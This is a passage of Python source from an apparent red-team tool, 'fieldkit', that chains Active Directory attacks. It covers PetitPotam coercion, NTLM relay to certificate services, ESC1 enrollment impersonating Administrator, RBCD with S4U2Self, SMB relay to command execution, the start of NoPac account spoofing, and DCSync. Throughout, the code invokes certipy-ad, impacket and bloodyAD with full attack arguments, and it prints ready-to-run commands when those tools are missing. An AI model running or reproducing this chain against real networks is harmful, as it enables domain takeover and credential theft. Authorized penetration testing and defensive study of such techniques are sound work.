              "relay_pid": listener.proc.pid if listener.proc else None})


def _relay_capture_action(chain, ctx):
    """Wait for the listener to catch a relay outcome (cert / cred /
    fail / timeout), stop the listener, and — if we got a
    certificate — persist it into Store.

    Reads:
      * ``ctx._relay_listener`` — the Listener spawned by
        :func:`_relay_listen_action` / :func:`_ensure_listener`.
      * ``ctx.relay_wait_capture`` (optional) — how long to wait for
        the caught auth to arrive after the coerce fired; default
        60s. Real coerces usually fire within seconds; a generous
        default absorbs a slow SMB timeout.
      * ``ctx.store`` (optional) — a fieldkit.state.Store; if set,
        a cert-ok outcome persists a certificate row linked to the
        chain via chain_id.
    """
    from . import relay as relay_mod
    listener = getattr(ctx, "_relay_listener", None)
    if listener is None:
        return Outcome(
            kind="fail",
            evidence="no relay listener attached to ctx — did relay:listen run?")
    timeout = getattr(ctx, "relay_wait_capture", 60.0)
    outcome = relay_mod.wait_capture(listener, timeout=timeout)
    listener.stop()

    if outcome.kind == "cert-ok":
        store = getattr(ctx, "store", None)
        cert_id = None
        chain_id = getattr(chain, "_persisted_id", None)   # set by CLI post-walk
        if store is not None and outcome.cert_bytes:
            cert_id = store.add_certificate(
                principal=outcome.principal or chain.target,
                cert_b64=outcome.cert_bytes,
                source="relay-adcs",
                template=listener.target.template,
                chain_id=chain_id)
        return Outcome(
            kind="ok",
            evidence=f"cert acquired for {outcome.principal or chain.target}"
                     + (f" (cert #{cert_id})" if cert_id else ""),
            data={"cert_id": cert_id,
                  "cert_principal": outcome.principal,
                  "cert_bytes": outcome.cert_bytes})
    if outcome.kind == "cred-ok":
        return Outcome(
            kind="ok",
            evidence=f"credential caught for {outcome.principal or '?'}",
            data={"relay_principal": outcome.principal})
    if outcome.kind == "cred-fail":
        return Outcome(
            kind="fail",
            evidence="relay caught an auth but it failed (STATUS_LOGON_FAILURE / ACCESS_DENIED)",
            data={"relay_detail": outcome.detail})
    if outcome.kind == "timeout":
        return Outcome(
            kind="fail",
            evidence=f"relay listener saw no auth in {timeout}s — coerce may have missed",
            data={"relay_detail": outcome.detail})
    if outcome.kind == "no-tool":
        return Outcome(
            kind="manual",
            evidence="ntlmrelayx not on PATH — run listener + coerce by hand "
                     "(install `impacket-scripts` package)")
    return Outcome(
        kind="fail",
        evidence=f"relay ended in unrecognized state ({outcome.kind})",
        data={"relay_detail": outcome.detail})


def _ensure_listener(chain, ctx):
    """Spawn the relay listener if it isn't already running; stash it
    on ctx and update ctx.listener_uri. Returns the Listener on
    success, or an Outcome on failure the caller re-raises.

    Called from BOTH _petitpotam_action (needs listener_uri) and
    _relay_listen_action (idempotent no-op if already spawned) so the
    chain step order stays flexible.

    Profile-aware in D5: reads ``ctx.relay_mode`` (adcs-cert / ldap-rbcd
    / smb-exec / socks) and ``ctx.relay_target`` (CA host for
    adcs-cert; DC for ldap-rbcd; workstation for smb-exec) instead of
    hardcoding esc8's shape. Backward-compat for D1-D4: when
    relay_mode is missing but ctx.ca_endpoint IS set, fall back to
    adcs-cert with ca_endpoint as the target (the esc8 path).
    """
    from . import relay as relay_mod
    listener = getattr(ctx, "_relay_listener", None)
    if listener is not None and listener.running:
        return listener
    listener_ip = getattr(ctx, "listener_ip", None)
    if not listener_ip:
        return Outcome(
            kind="manual",
            evidence=("no listener_ip on ctx — run "
                      "`fieldkit chain run <profile> <target> --listener-ip <fieldkit-ip> "
                      "…` to enable the relay listener"))
    # Profile-aware mode selection with backward-compat.
    mode = getattr(ctx, "relay_mode", None)
    relay_target = getattr(ctx, "relay_target", None)
    ca_endpoint = getattr(ctx, "ca_endpoint", None)
    if mode is None:
        if ca_endpoint:
            mode = "adcs-cert"
            relay_target = ca_endpoint
        else:
            return Outcome(
                kind="manual",
                evidence=("no relay_mode or ca_endpoint on ctx — pass "
                          "--ca <host> for esc8, --relay-target for rbcd/smb-relay"))
    if not relay_target:
        return Outcome(
            kind="manual",
            evidence=(f"no relay_target on ctx for mode={mode!r} — the "
                      f"listener needs a target service to relay to"))
    target = relay_mod.RelayTarget(
        mode=mode,
        target=relay_target,
        template=getattr(ctx, "template", "DomainController"))
    listener = relay_mod.start(
        target=target,
        listener_ip=listener_ip,
        port_smb=getattr(ctx, "relay_port_smb", 445),
        port_http=getattr(ctx, "relay_port_http", 80),
        bind_addr=getattr(ctx, "relay_bind_addr", "0.0.0.0"),
        tool_bin=getattr(ctx, "relay_tool_bin", None),
        bind_wait=getattr(ctx, "relay_bind_wait", 3.0))
    ctx._relay_listener = listener       # noqa: SLF001 — ctx is per-run
    if listener.listener_uri:
        ctx.listener_uri = listener.listener_uri
    return listener


def _petitpotam_action(chain, ctx):
    """The D2 landing: fire the PetitPotam MS-EFSR coerce and map the
    :class:`~fieldkit.coerce.CoerceResult` kind to a chain Outcome.

    Reads from ``ctx``:
      * ``ctx.listener_uri``  (required) — SMB path the target will
        auth to. Set to a placeholder that reaches the relay listener
        D3 stands up; None → manual outcome ("listener not configured").
      * ``ctx.cred`` (optional) — dict {domain, username, password} for
        auth to the MS-EFSR endpoint. Modern DCs require it.
      * ``ctx.petitpotam_tool_bin`` (optional) — override the tool path
        the primitive auto-detects. Test hook + operator override.
      * ``ctx.petitpotam_timeout`` (optional) — subprocess timeout.
    """
    from .coerce import petitpotam
    listener_uri = getattr(ctx, "listener_uri", None)
    if not listener_uri:
        # D3: try to spawn the relay listener now — coerce runs before
        # relay:listen in the plan, but the coerce needs a listener_uri
        # to point at, so the primitive owns the spawn if the operator
        # supplied enough to build one.
        listener = _ensure_listener(chain, ctx)
        if isinstance(listener, Outcome):
            return listener       # manual/fail bubbling from _ensure_listener
        listener_uri = listener.listener_uri
        if not listener_uri:
            return Outcome(
                kind="fail",
                evidence="relay listener could not bind — cannot proceed with coerce",
                data={"relay_bind_lines": listener.captured_lines[-10:]})
    result = petitpotam.fire(
        target=chain.target,
        listener_uri=listener_uri,
        cred=getattr(ctx, "cred", None),
        tool_bin=getattr(ctx, "petitpotam_tool_bin", None),
        tool_timeout=getattr(ctx, "petitpotam_timeout", 15))
    # Map coerce kind → chain outcome kind.
    #   ok         → ok         (proceed to relay step)
    #   patched    → skip       (this DC is patched; profile aborts;
    #                            D4/D5 will introduce PrinterBug fallback)
    #   unreachable → fail      (chain can't recover)
    #   auth-error → fail       (bad or missing cred)
    #   no-tool    → manual     (prepare-only playbook: operator runs
    #                            the command_hint themselves)
    #   fail       → fail
    kind_map = {"ok": "ok", "patched": "skip", "unreachable": "fail",
                "auth-error": "fail", "no-tool": "manual", "fail": "fail"}
    outcome_kind = kind_map[result.kind]
    # For the no-tool path, tack the command hint onto the evidence
    # so `fieldkit chain show` renders it inline.
    evidence = result.evidence
    if result.kind == "no-tool" and result.command_hint:
        evidence = f"{evidence}\n  run: {result.command_hint}"
    return Outcome(
        kind=outcome_kind,
        evidence=evidence,
        data={"petitpotam": {
            "listener_uri": listener_uri,
            "result_kind": result.kind,
            "detail": result.detail,
        }})


# ---------------------------------------------------------------- esc1 steps

def _esc1_discover_action(chain, ctx):
    """Use `certipy find` to enumerate ADCS templates on the target
    CA and identify ESC1-vulnerable ones (client-auth EKU +
    ENROLLEE_SUPPLIES_SUBJECT + broad enrollment ACL). Populates
    chain.artifacts with the discovered vulnerable-template names.

    Reads:
      * ctx.domain (required) — AD domain (CORP.LOCAL)
      * ctx.cred (required) — {domain, username, password} for LDAP auth
      * ctx.esc1_tool_bin (optional) — certipy-ad override
      * ctx.esc1_timeout (optional) — subprocess timeout
    """
    import re as _re
    import shutil
    from . import runner as runner_mod
    domain = getattr(ctx, "domain", None)
    cred = getattr(ctx, "cred", None)
    if not domain:
        return Outcome(
            kind="manual",
            evidence="no domain on ctx — pass --domain <AD-DOMAIN> for ESC1 discover")
    if not cred:
        return Outcome(
            kind="manual",
            evidence="no cred on ctx — pass --cred-id <N> for ESC1 discover (needs LDAP auth)")
    tool = getattr(ctx, "esc1_tool_bin", None) or shutil.which("certipy-ad")
    if not tool:
        return Outcome(
            kind="manual",
            evidence=(f"certipy-ad not on PATH; run:\n"
                      f"  certipy-ad find -u '{cred.get('username','')}@{domain}' "
                      f"-p '{cred.get('password','')}' -dc-ip {chain.target} "
                      f"-vulnerable"))
    user = cred.get("username", "")
    pw = cred.get("password", "")
    argv = [tool, "find",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-dc-ip", chain.target,
            "-vulnerable",
            "-stdout"]
    result = runner_mod.run(argv, timeout=getattr(ctx, "esc1_timeout", 60))
    if result.error and "not found" in result.error:
        return Outcome(kind="manual",
                        evidence=f"certipy-ad vanished before exec: {result.error}")
    if result.timed_out:
        return Outcome(kind="fail",
                        evidence="certipy find timed out — CA may be unreachable",
                        data={"detail": result.stdout + result.stderr})
    output = result.stdout + result.stderr
    # certipy's -vulnerable output lists templates under "ESC1"
    # headings. Simplest parse: any line matching `Template Name`
    # after an ESC1 header until the next ESC header or end.
    templates = []
    in_esc1 = False
    for line in output.splitlines():
        stripped = line.strip()
        if _re.match(r"ESC1\b", stripped):
            in_esc1 = True
            continue
        if _re.match(r"ESC\d+\b", stripped):
            in_esc1 = False
            continue
        if in_esc1:
            m = _re.match(r"Template Name\s*:\s*(.+)", stripped)
            if m:
                templates.append(m.group(1).strip())
    # Also parse the CA name — certipy req needs it.
    ca_name = ""
    m = _re.search(r"CA Name\s*:\s*(.+)", output)
    if m:
        ca_name = m.group(1).strip()
    if not templates:
        return Outcome(
            kind="skip",
            evidence="no ESC1-vulnerable templates found — profile aborts (no target)",
            data={"esc1_detail": output[-1024:]})
    return Outcome(
        kind="ok",
        evidence=f"discovered {len(templates)} ESC1-vulnerable template(s): "
                 f"{', '.join(templates[:3])}"
                 + (f" +{len(templates)-3} more" if len(templates) > 3 else ""),
        data={"esc1_templates": templates,
              "esc1_ca_name": ca_name,
              "esc1_first_template": templates[0]})


def _esc1_enroll_action(chain, ctx):
    """Use certipy-ad req to enroll a certificate against an ESC1
    template with an alternative SAN (Subject Alternative Name)
    that impersonates a Domain Admin. The resulting cert is
    subject-alt for Administrator@<domain>; PKINIT with it lands
    a TGT for Administrator.

    Reads:
      * chain.artifacts["esc1_first_template"] / ["esc1_ca_name"]
        (from _esc1_discover_action)
      * ctx.domain (required)
      * ctx.cred (required — same LDAP-auth cred as discover)
      * ctx.impersonate (default "Administrator") — the target UPN
      * ctx.esc1_tool_bin / ctx.esc1_enroll_timeout
    """
    import re as _re
    import shutil
    from . import runner as runner_mod
    template = chain.artifacts.get("esc1_first_template", "")
    ca_name = chain.artifacts.get("esc1_ca_name", "")
    domain = getattr(ctx, "domain", None)
    cred = getattr(ctx, "cred", None)
    impersonate = getattr(ctx, "impersonate", "Administrator")
    if not (template and ca_name and domain and cred):
        return Outcome(
            kind="fail",
            evidence="esc1_enroll needs template + ca_name + domain + cred — discover step must have failed")
    tool = getattr(ctx, "esc1_tool_bin", None) or shutil.which("certipy-ad")
    if not tool:
        hint = (f"certipy-ad req -u '{cred.get('username','')}@{domain}' "
                f"-p '{cred.get('password','')}' -ca '{ca_name}' -dc-ip {chain.target} "
                f"-template '{template}' -upn '{impersonate}@{domain}'")
        return Outcome(kind="manual",
                        evidence=f"certipy-ad not on PATH; run:\n  {hint}")
    user = cred.get("username", "")
    pw = cred.get("password", "")
    argv = [tool, "req",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-ca", ca_name,
            "-dc-ip", chain.target,
            "-template", template,
            "-upn", f"{impersonate}@{domain}"]
    result = runner_mod.run(argv, timeout=getattr(ctx, "esc1_enroll_timeout", 60))
    if result.error and "not found" in result.error:
        return Outcome(kind="manual",
                        evidence=f"certipy-ad vanished before exec: {result.error}")
    if result.timed_out:
        return Outcome(kind="fail",
                        evidence="certipy req timed out — CA enrollment unreachable",
                        data={"detail": result.stdout + result.stderr})
    output = result.stdout + result.stderr
    # certipy saves the cert as `<upn>.pfx` and prints "Saved
    # certificate and private key to `<path>`" on success.
    m = _re.search(r"Saved certificate and private key to\s+['\"]?(\S+?\.pfx)",
                   output)
    if not m:
        # Common failure: template's ACL didn't actually grant enrollment
        # to our SA, or SubjectAlt SAN isn't allowed on this template.
        if "PERMISSION_DENIED" in output or "access denied" in output.lower():
            return Outcome(
                kind="skip",
                evidence="ESC1 enroll denied — template ACL doesn't grant to us",
                data={"detail": output[-512:]})
        return Outcome(
            kind="fail",
            evidence="ESC1 enroll failed — output did not report a saved PFX",
            data={"detail": output[-512:]})
    pfx_path = m.group(1)
    # Read the PFX bytes back into artifacts so the post:pkinit-tgt
    # step (reused from D4) can materialize + PKINIT it. certipy
    # writes an unencrypted PFX.
    import base64 as _b64
    try:
        with open(pfx_path, "rb") as fh:
            cert_b64 = _b64.b64encode(fh.read()).decode()
    except (OSError, IOError) as exc:
        return Outcome(
            kind="fail",
            evidence=f"could not read PFX at {pfx_path}: {exc}",
            data={"detail": output[-512:]})
    principal = f"{domain.split('.')[0].upper()}/{impersonate}"
    return Outcome(
        kind="ok",
        evidence=f"enrolled ESC1 cert for {impersonate}@{domain} via template "
                 f"{template!r} → {pfx_path}",
        data={"cert_bytes": cert_b64,
              "cert_principal": principal,
              "esc1_pfx_path": pfx_path})


# ---------------------------------------------------------------- rbcd + smb-relay steps

def _rbcd_capture_action(chain, ctx):
    """RBCD-mode variant of relay:capture. Polls ntlmrelayx stdout
    for the "Delegation rights modified" line ntlmrelayx emits after
    it writes msDS-AllowedToActOnBehalfOfOtherIdentity via the LDAPS
    relay + --delegate-access flag. Records the "shadow" machine
    account ntlmrelayx auto-adds so S4U2Self has a credential.

    Custom poll loop (not :func:`wait_capture`) because the generic
    classifier looks for cert/cred/fail signatures — the RBCD success
    line matches none of them, so wait_capture would time out even on
    a real success. The RBCD signature is distinct enough to poll for
    directly.
    """
    import re as _re
    import time as _time
    listener = getattr(ctx, "_relay_listener", None)
    if listener is None:
        return Outcome(
            kind="fail",
            evidence="no relay listener attached to ctx — did relay:listen run?")
    if not listener.tool_bin:
        return Outcome(kind="manual",
                        evidence="ntlmrelayx not on PATH — install `impacket-scripts`")
    if not listener.listener_uri:
        return Outcome(
            kind="fail",
            evidence="relay listener could not bind",
            data={"relay_detail": "\n".join(listener.captured_lines[-20:])})
    timeout = getattr(ctx, "relay_wait_capture", 60.0)
    poll = getattr(ctx, "relay_poll_interval", 0.1)
    deadline = _time.monotonic() + timeout
    delegation_re = _re.compile(r"Delegation rights modified")
    while _time.monotonic() < deadline:
        text = "\n".join(listener.captured_lines)
        if delegation_re.search(text):
            break
        # Distinguish "caught an auth but delegation write failed" from
        # "no auth caught yet" — the auth-attempt line arrives first,
        # then the delegation edit; if we see the auth-attempt and
        # 3 seconds pass without a delegation line, treat as failure.
        if listener.proc is not None and listener.proc.poll() is not None:
            break
        _time.sleep(poll)
    listener.stop()
    text = "\n".join(listener.captured_lines)
    if not delegation_re.search(text):
        if "Authenticating against" in text:
            return Outcome(
                kind="fail",
                evidence="LDAPS relay caught an auth but delegation edit did not land",
                data={"relay_detail": text[-1024:]})
        return Outcome(
            kind="fail",
            evidence=f"relay saw no LDAPS auth in {timeout}s — coerce may have missed",
            data={"relay_detail": text[-1024:]})
    # Parse the shadow account ntlmrelayx creates: usually a
    # ``[X$]`` machine account name + ``[Y]`` password.
    m = _re.search(r"account\s+\[(\S+)\]\s+with password\s+\[([^\]]+)\]", text)
    shadow_user = m.group(1) if m else ""
    shadow_pass = m.group(2) if m else ""
    # And the principal ntlmrelayx caught the auth from.
    m = _re.search(r"Authenticating against\s+\S+\s+as\s+(\S+)", text)
    caught_principal = m.group(1) if m else ""
    return Outcome(
        kind="ok",
        evidence=f"RBCD ACL added on {chain.target} via {caught_principal or '?'};"
                 f" shadow cred [{shadow_user}/{shadow_pass}]",
        data={"rbcd_shadow_user": shadow_user,
              "rbcd_shadow_pass": shadow_pass,
              "rbcd_caught_principal": caught_principal,
              "rbcd_target": chain.target})


def _s4u2self_action(chain, ctx):
    """Use the RBCD shadow credential to request a service ticket
    impersonating a domain admin against the RBCD target's CIFS SPN.
    Uses impacket-getST via runner.run.

    Reads:
      * chain.artifacts['rbcd_shadow_user'] / ['rbcd_shadow_pass']
      * chain.artifacts['rbcd_target'] — the workstation the ACL edit landed on
      * ctx.domain (required)
      * ctx.impersonate (default 'Administrator') — the account to
        impersonate via S4U2Self.
    """
    import shutil
    from . import runner as runner_mod
    shadow_user = chain.artifacts.get("rbcd_shadow_user", "")
    shadow_pass = chain.artifacts.get("rbcd_shadow_pass", "")
    target = chain.artifacts.get("rbcd_target", "")
    domain = getattr(ctx, "domain", None)
    impersonate = getattr(ctx, "impersonate", "Administrator")
    if not (shadow_user and shadow_pass and target and domain):
        return Outcome(
            kind="fail",
            evidence="s4u2self needs shadow cred + target + domain — rbcd:capture must have failed")
    tool = getattr(ctx, "s4u2self_tool_bin", None) or shutil.which("impacket-getST")
    if not tool:
        hint = (f"impacket-getST -spn 'CIFS/{target}' "
                f"-impersonate '{impersonate}' -dc-ip <dc> "
                f"'{domain}/{shadow_user.rstrip('$')}$:{shadow_pass}'")
        return Outcome(
            kind="manual",
            evidence=f"impacket-getST not on PATH; run:\n  {hint}")
    argv = [
        tool, "-spn", f"CIFS/{target}",
        "-impersonate", impersonate,
        "-dc-ip", getattr(ctx, "dc_ip", chain.target),
        f"{domain}/{shadow_user.rstrip('$')}$:{shadow_pass}",
    ]
    result = runner_mod.run(argv, timeout=getattr(ctx, "s4u2self_timeout", 30))
    if result.error and "not found" in result.error:
        return Outcome(kind="manual",
                        evidence=f"impacket-getST vanished before exec: {result.error}")
    if result.timed_out:
        return Outcome(kind="fail",
                        evidence="s4u2self subprocess timed out",
                        data={"detail": result.stdout + result.stderr})
    output = result.stdout + result.stderr
    if "Saving ticket in" in output:
        # ticket path from output: "Saving ticket in Administrator@CIFS_target@DOMAIN.ccache"
        import re as _re
        m = _re.search(r"Saving ticket in\s+(\S+\.ccache)", output)
        ccache_path = m.group(1) if m else ""
        return Outcome(
            kind="ok",
            evidence=f"S4U2Self obtained CIFS/{target} ticket impersonating {impersonate}"
                     + (f" → {ccache_path}" if ccache_path else ""),
            data={"s4u2self_ccache": ccache_path,
                  "s4u2self_impersonate": impersonate})
    if "KDC_ERR" in output:
        return Outcome(kind="fail",
                        evidence="KDC rejected S4U2Self — RBCD ACL may not have landed",
                        data={"detail": output[-512:]})
    return Outcome(kind="fail",
                    evidence="s4u2self ended in unrecognized state",
                    data={"detail": output[-512:]})


def _smb_relay_capture_action(chain, ctx):
    """SMB-relay-exec variant of relay:capture. Waits for ntlmrelayx
    to report a caught auth relayed to an SMB signing-disabled target.
    ntlmrelayx by default drops a SOCKS session; we surface the caught
    principal + any output ntlmrelayx executed.
    """
    from . import relay as relay_mod
    listener = getattr(ctx, "_relay_listener", None)
    if listener is None:
        return Outcome(kind="fail",
                        evidence="no relay listener attached — did relay:listen run?")
    timeout = getattr(ctx, "relay_wait_capture", 60.0)
    outcome = relay_mod.wait_capture(listener, timeout=timeout)
    listener.stop()
    if outcome.kind == "no-tool":
        return Outcome(kind="manual",
                        evidence="ntlmrelayx not on PATH")
    if outcome.kind == "bind-fail":
        return Outcome(kind="fail", evidence="relay listener could not bind")
    if outcome.kind == "timeout":
        return Outcome(kind="fail",
                        evidence=f"no SMB auth caught in {timeout}s")
    text = "\n".join(listener.captured_lines)
    import re as _re
    m = _re.search(r"Authenticating against\s+\S+\s+as\s+(\S+)", text)
    principal = m.group(1) if m else ""
    if outcome.kind not in ("cred-ok", "cert-ok"):
        return Outcome(
            kind="fail",
            evidence=f"SMB relay caught an auth but exec did not land ({outcome.kind})",
            data={"detail": text[-1024:]})
    return Outcome(
        kind="ok",
        evidence=f"SMB relay landed against {chain.target} as {principal or '?'}",
        data={"smb_relay_principal": principal,
              "smb_relay_target": chain.target})


# ---------------------------------------------------------------- esc8 profile

@register("esc8")
def esc8_chain(target_dc, ca_endpoint=None, cred=None):
    """The canonical fieldkit coerce chain: coerce a DC → HTTP-relay
    to the enterprise CA → obtain a certificate for the DC account →
    PKINIT → DCSync.

    Every step is a live primitive: reachability preflight, the
    PetitPotam coerce, the ntlmrelayx listener + capture, the
    ADCS cert-request validation, PKINIT AS-REQ, and DCSync
    via DRSUAPI.
    """
    _ = ca_endpoint, cred        # threaded into steps via ctx by the CLI
    return Chain(
        profile="esc8",
        target=target_dc,
        steps=(
            REACHABILITY_STEP,
            Step("coerce:petitpotam",
                 "target-side",
                 _petitpotam_action,
                 detection_cost=3,
                 signals=SIGNALS_PETITPOTAM_COERCE),
            Step("relay:listen",
                 "attacker-side",
                 _relay_listen_action,
                 detection_cost=1,
                 signals=SIGNALS_RELAY_LISTEN),
            Step("relay:capture",
                 "attacker-side",
                 _relay_capture_action,
                 detection_cost=2,
                 signals=SIGNALS_RELAY_CAPTURE_ADCS),
            Step("post:cert-request",
                 "attacker-side",
                 _cert_request_action,
                 detection_cost=0,
                 signals=SIGNALS_CERT_REQUEST_VALIDATE),
            Step("post:pkinit-tgt",
                 "attacker-side",
                 _pkinit_action,
                 detection_cost=0,
                 signals=SIGNALS_PKINIT_TGT),
            Step("post:dcsync",
                 "attacker-side",
                 _dcsync_action,
                 detection_cost=3,
                 signals=SIGNALS_DCSYNC),
        ))


# ---------------------------------------------------------------- rbcd profile

@register("rbcd")
def rbcd_chain(target_ws, dc_ip=None, cred=None):
    """Resource-Based Constrained Delegation chain: coerce a workstation
    to auth to fieldkit's LDAPS relay, ntlmrelayx writes
    msDS-AllowedToActOnBehalfOfOtherIdentity for a shadow computer
    account on the target, then S4U2Self produces a CIFS ticket
    impersonating a domain admin against the workstation.

    Requires: target workstation NOT in Protected Users group; DC
    with LDAPS reachable from fieldkit; a coerce primitive that
    works on the workstation (PetitPotam works on modern client
    Windows too, since the MS-EFSR endpoint ships enabled).
    """
    _ = dc_ip, cred      # threaded through ctx by the CLI
    return Chain(
        profile="rbcd",
        target=target_ws,
        steps=(
            REACHABILITY_STEP,
            Step("coerce:petitpotam",
                 "target-side",
                 _petitpotam_action,
                 detection_cost=3,
                 signals=SIGNALS_PETITPOTAM_COERCE),
            Step("relay:listen",
                 "attacker-side",
                 _relay_listen_action,
                 detection_cost=1,
                 signals=SIGNALS_RELAY_LISTEN),
            Step("relay:capture",
                 "attacker-side",
                 _rbcd_capture_action,
                 detection_cost=3,
                 signals=SIGNALS_RELAY_CAPTURE_RBCD),
            Step("post:s4u2self",
                 "attacker-side",
                 _s4u2self_action,
                 detection_cost=1,
                 signals=SIGNALS_S4U2SELF),
        ))


# ---------------------------------------------------------------- smb-relay-exec profile

@register("smb-relay-exec")
def smb_relay_exec_chain(target_smb, secondary_target=None, cred=None):
    """Coerce a host, relay the caught auth to a SECOND host that has
    SMB signing disabled, land command execution there.

    Two distinct targets: ``target_smb`` is the host being coerced
    (the auth source); the RELAY target lives on ``ctx.relay_target``
    (must be different from the coerced host — you can't relay a
    host's own auth back to itself). ntlmrelayx does the exec
    directly via its default SMB attack.

    Requires: SMB signing DISABLED on the relay target (this is the
    load-bearing precondition; scan with `nxc smb <ip> --gen-relay-list`
    beforehand).
    """
    _ = secondary_target, cred
    return Chain(
        profile="smb-relay-exec",
        target=target_smb,
        steps=(
            REACHABILITY_STEP,
            Step("coerce:petitpotam",
                 "target-side",
                 _petitpotam_action,
                 detection_cost=3,
                 signals=SIGNALS_PETITPOTAM_COERCE),
            Step("relay:listen",
                 "attacker-side",
                 _relay_listen_action,
                 detection_cost=1,
                 signals=SIGNALS_RELAY_LISTEN),
            Step("relay:capture",
                 "attacker-side",
                 _smb_relay_capture_action,
                 detection_cost=3,
                 signals=SIGNALS_RELAY_CAPTURE_SMBEXEC),
        ))


# ---------------------------------------------------------------- esc1 profile

@register("esc1")
def esc1_chain(target_dc, ca_name=None, cred=None):
    """AD Certificate Services ESC1: enroll a certificate against a
    template that grants low-priv users enrollment + allows the
    enrollee to specify an arbitrary Subject Alternative Name.
    The cert's UPN SAN can name any principal (Administrator@corp);
    PKINIT with it lands a TGT for that principal → DCSync.

    Different from ESC8 in what generates the certificate: ESC8
    coerces a machine account to authenticate to a relay that
    talks to the CA. ESC1 goes direct — the operator's low-priv
    user is what enrolls, no coerce needed, so no PetitPotam +
    no ntlmrelayx. Structurally simpler + quieter (no event 4624
    on the coerced account); only lights up on ADCS deployments
    with a misconfigured template.

    5 steps:
      reachability → discover → enroll → pkinit-tgt → dcsync
    All 5 attacker-side + LDAP/HTTP-only; no coerce; no listener.
    """
    _ = ca_name, cred      # threaded through ctx by the CLI
    return Chain(
        profile="esc1",
        target=target_dc,
        steps=(
            REACHABILITY_STEP,
            Step("discover:esc1-templates",
                 "attacker-side",
                 _esc1_discover_action,
                 detection_cost=1,
                 signals=SIGNALS_ESC1_DISCOVER),
            Step("exploit:esc1-enroll",
                 "attacker-side",
                 _esc1_enroll_action,
                 detection_cost=2,
                 signals=SIGNALS_ESC1_ENROLL),
            Step("post:pkinit-tgt",
                 "attacker-side",
                 _pkinit_action,
                 detection_cost=0,
                 signals=SIGNALS_PKINIT_TGT),
            Step("post:dcsync",
                 "attacker-side",
                 _dcsync_action,
                 detection_cost=3,
                 signals=SIGNALS_DCSYNC),
        ))


# ---------------------------------------------------------------- NoPac profile

def _nopac_quota_action(chain, ctx):
    """Read ms-DS-MachineAccountQuota on the domain root — the default
    is 10, meaning any authenticated user can add up to 10 computer
    accounts. The whole NoPac chain hinges on this being non-zero.

    Manual-outcome step in this cut — the actual LDAP read wants
    impacket / ldap3 / bloodyAD which fieldkit calls out to.
    Evidence names each exact command."""
    _ = chain
    domain = getattr(ctx, "domain", None)
    if not domain:
        return Outcome(
            kind="manual",
            evidence="no domain on ctx — pass --domain <AD-DOMAIN> "
                     "for NoPac quota check")
    return Outcome(
        kind="manual",
        evidence=(f"check ms-DS-MachineAccountQuota on {domain} — expect >0. "
                  f"Run: `nxc ldap {chain.target} -u <user> -p <pass> "
                  f"-M maq` or `bloodyAD --host {chain.target} -u <user> "
                  f"-p <pass> get object 'DC=corp,DC=local' "
                  f"--attr ms-DS-MachineAccountQuota`"))


#: Default computer-account name + password fieldkit installs.
#: Placeholder-shaped ("FKPWN") so a post-eng defender audit can
#: spot the operator's footprint quickly if cleanup was skipped.
_NOPAC_COMPUTER = "FKPWN"
_NOPAC_PASSWORD = "F1eldk1t!"


def _nopac_addcomputer_action(chain, ctx):
    """Create a fresh computer account in the domain via
    ``impacket-addcomputer``. When the tool is on PATH + a cred
    is on ctx, executes for real; otherwise falls back to a
    manual-outcome hint. On success stores the computer name +
    password into ``chain.artifacts`` for the modify:sam-spoof
    step to reference."""
    import shutil
    from . import runner as runner_mod
    cred = getattr(ctx, "cred", None)
    domain = getattr(ctx, "domain", None) or "<domain>"
    if not cred:
        return Outcome(
            kind="manual",
            evidence="no cred on ctx — pass --cred-id <N> for NoPac "
                     "(needs a low-priv domain credential)")
    user = cred.get("username", "<user>")
    pw = cred.get("password", "<pass>")
    tool = getattr(ctx, "nopac_addcomputer_bin", None) \
        or shutil.which("impacket-addcomputer") \
        or shutil.which("addcomputer.py")
    if not tool:
        return Outcome(
            kind="manual",
            evidence=(f"impacket-addcomputer not on PATH — run:\n"
                      f"  impacket-addcomputer -computer-name "
                      f"'{_NOPAC_COMPUTER}$' -computer-pass "
                      f"'{_NOPAC_PASSWORD}' -dc-ip {chain.target} "
                      f"'{domain}/{user}:{pw}'"))
    argv = [tool,
            "-computer-name", f"{_NOPAC_COMPUTER}$",
            "-computer-pass", _NOPAC_PASSWORD,
            "-dc-ip", chain.target,
            f"{domain}/{user}:{pw}"]
    result = runner_mod.run(argv, timeout=getattr(ctx, "nopac_timeout", 60))
    if result.error:
        return Outcome(kind="fail",
                        evidence=f"impacket-addcomputer vanished: {result.error}")
    if result.timed_out:
        return Outcome(kind="fail",
                        evidence="impacket-addcomputer timed out")
    output = (result.stdout or "") + (result.stderr or "")
    if "Successfully added machine account" in output:
        return Outcome(
            kind="ok",
            evidence=f"created {_NOPAC_COMPUTER}$ (password "
                     f"{_NOPAC_PASSWORD}) in {domain}",
            data={"nopac_computer": _NOPAC_COMPUTER,
                  "nopac_password": _NOPAC_PASSWORD})
    if "STATUS_USER_EXISTS" in output or "already exists" in output:
        # Retryable — the account is present from a prior run.
        # Continue the chain assuming the operator's default password
        # still applies.
        return Outcome(
            kind="manual",
            evidence=(f"{_NOPAC_COMPUTER}$ already exists in {domain} — "
                      "reusing (verify password matches operator's default)"),
            data={"nopac_computer": _NOPAC_COMPUTER,
                  "nopac_password": _NOPAC_PASSWORD})
    return Outcome(
        kind="fail",
        evidence=(f"impacket-addcomputer failed: "
                  f"{output.strip()[:200]}"),
        data={"detail": output[-1024:]})


def _nopac_sam_spoof_action(chain, ctx):
    """Rename the created computer account's sAMAccountName to
    match a DC's name (minus the trailing $). CVE-2021-42278 —
    the KDC looks up the account by sAMAccountName during
    S4U2self, so a rename-to-DC-name passes as the real DC.
    Uses ``bloodyAD`` when on PATH; manual-outcome hint otherwise."""
    import shutil
    from . import runner as runner_mod
    cred = getattr(ctx, "cred", None) or {}
    domain = getattr(ctx, "domain", None) or "<domain>"
    dc_name = getattr(ctx, "dc_name", None) or "DC01"
    user = cred.get("username", "<user>")
    pw = cred.get("password", "<pass>")
    computer = chain.artifacts.get("nopac_computer", _NOPAC_COMPUTER)
    tool = getattr(ctx, "nopac_bloodyad_bin", None) \
        or shutil.which("bloodyAD") \
        or shutil.which("bloodyad")
    if not tool:
        return Outcome(
            kind="manual",
            evidence=(f"bloodyAD not on PATH — run:\n"
                      f"  bloodyAD --host {chain.target} -u '{user}' "
                      f"-p '{pw}' -d '{domain}' set object "
                      f"'CN={computer},CN=Computers,"
                      f"{_dn_from_domain(domain)}' sAMAccountName "
                      f"-v '{dc_name}'"))
